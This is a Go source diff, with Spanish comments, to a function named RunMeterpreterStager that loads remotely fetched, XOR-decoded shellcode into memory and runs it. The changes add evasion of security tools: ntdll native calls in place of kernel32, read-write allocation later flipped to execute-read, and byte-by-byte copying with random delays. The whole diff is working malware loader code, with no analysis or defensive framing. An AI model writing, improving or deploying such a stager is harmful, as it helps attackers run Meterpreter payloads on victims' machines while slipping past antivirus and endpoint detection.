@@ -6,9 +6,11 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net/http"
 	"os"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -62,49 +64,78 @@ func RunMeterpreterStager(url string) error {
 		log.Printf("Shellcode vacío")
 		return fmt.Errorf("shellcode vacío")
 	}
+
+	// 🔓 XOR-decodificación
 	key := byte(0xAA)
 	for i := range shellcode {
 		shellcode[i] ^= key
 	}
 
-	// Reservar memoria con permisos de ejecución
-	addr, _, errVirtualAlloc := syscall.NewLazyDLL("kernel32.dll").
-		NewProc("VirtualAlloc").
-		Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-	if addr == 0 {
-		log.Printf("fallo VirtualAlloc: %v", errVirtualAlloc)
-		return fmt.Errorf("fallo VirtualAlloc: %v", errVirtualAlloc)
-	}
+	// 🧠 NtDLL: NtAllocateVirtualMemory + NtCreateThreadEx + NtProtectVirtualMemory
+	ntdll := syscall.NewLazyDLL("ntdll.dll")
+	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
+	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
+	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
 
-	// Copiar el shellcode a la memoria alocada
-	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
-	copy(mem, shellcode)
+	var baseAddress uintptr
+	regionSize := uintptr(len(shellcode))
+	currentProcess := uintptr(0xffffffffffffffff) // Pseudo-handle
 
-	log.Printf("Shellcode cargado en memoria en 0x%x", addr)
-
-	// Ejecutar usando CreateThread
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	createThread := kernel32.NewProc("CreateThread")
-	waitForSingleObject := kernel32.NewProc("WaitForSingleObject")
-
-	thread, _, errThread := createThread.Call(
-		0,    // lpThreadAttributes
-		0,    // dwStackSize
-		addr, // lpStartAddress (donde está el shellcode)
-		0,    // lpParameter
-		0,    // dwCreationFlags
-		0,    // lpThreadId
+	// 🛠 NtAllocateVirtualMemory → RW only
+	status, _, _ := ntAllocateVirtualMemory.Call(
+		currentProcess,
+		uintptr(unsafe.Pointer(&baseAddress)),
+		0,
+		uintptr(unsafe.Pointer(&regionSize)),
+		MEM_COMMIT|MEM_RESERVE,
+		0x04, // PAGE_READWRITE
 	)
-	if thread == 0 {
-		log.Printf("Error en CreateThread: %v", errThread)
-		return fmt.Errorf("CreateThread falló: %v", errThread)
+	if status != 0 {
+		log.Printf("NtAllocateVirtualMemory falló: 0x%x", status)
+		return fmt.Errorf("NtAllocateVirtualMemory falló: 0x%x", status)
 	}
 
-	log.Println("Shellcode ejecutado en un nuevo hilo")
+	log.Printf("Memoria RW alocada en: 0x%x", baseAddress)
 
-	// Esperar a que termine (evita que el proceso se cierre antes de que el shellcode actúe)
-	waitForSingleObject.Call(thread, syscall.INFINITE)
+	// 🧪 Copia fragmentada
+	mem := unsafe.Slice((*byte)(unsafe.Pointer(baseAddress)), len(shellcode))
+	rand.Seed(time.Now().UnixNano())
+	for i := 0; i < len(shellcode); i++ {
+		mem[i] = shellcode[i]
+		time.Sleep(time.Duration(rand.Intn(15)+5) * time.Millisecond)
+	}
 
+	// 🔒 Cambiar permisos RW → RX
+	oldProtect := uintptr(0)
+	status, _, _ = ntProtectVirtualMemory.Call(
+		currentProcess,
+		uintptr(unsafe.Pointer(&baseAddress)),
+		uintptr(unsafe.Pointer(&regionSize)),
+		0x20, // PAGE_EXECUTE_READ
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if status != 0 {
+		log.Printf("NtProtectVirtualMemory falló: 0x%x", status)
+		return fmt.Errorf("NtProtectVirtualMemory falló: 0x%x", status)
+	}
+	log.Println("Protección cambiada a RX (PAGE_EXECUTE_READ)")
+
+	// 🚀 Ejecutar con NtCreateThreadEx
+	var hThread uintptr
+	status, _, _ = ntCreateThreadEx.Call(
+		uintptr(unsafe.Pointer(&hThread)),
+		0x1FFFFF,
+		0,
+		currentProcess,
+		baseAddress,
+		0, 0, 0, 0, 0,
+	)
+	if status != 0 {
+		log.Printf("NtCreateThreadEx falló: 0x%x", status)
+		return fmt.Errorf("NtCreateThreadEx falló: 0x%x", status)
+	}
+
+	log.Println("[+] Shellcode ejecutado con NtCreateThreadEx")
 	return nil
 }
 
